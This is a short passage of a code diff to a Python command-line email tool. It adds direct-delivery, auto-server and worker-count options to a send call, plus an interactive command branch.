         sys.exit(0 if success else 1)
 
@@ -2072,6 +2795,9 @@ Author: {__author__} | License: {__license__}
             subject=args.subject,
             body=effective_body,
             validate_dns=not args.no_dns_check,
+            direct_delivery=args.direct,
+            auto_server=not args.no_auto_server,
+            workers=args.workers,
         )
         sys.exit(0 if success else 1)
 
@@ -2086,6 +2812,10 @@ Author: {__author__} | License: {__license__}
     elif args.command == 'report':
         est.print_banner()
         est.generate_report(args.output)
+
+    elif args.command == 'interactive':
+        est.print_banner()
+        est.run_interactive()
 
 if __name__ == "__main__":
     main()
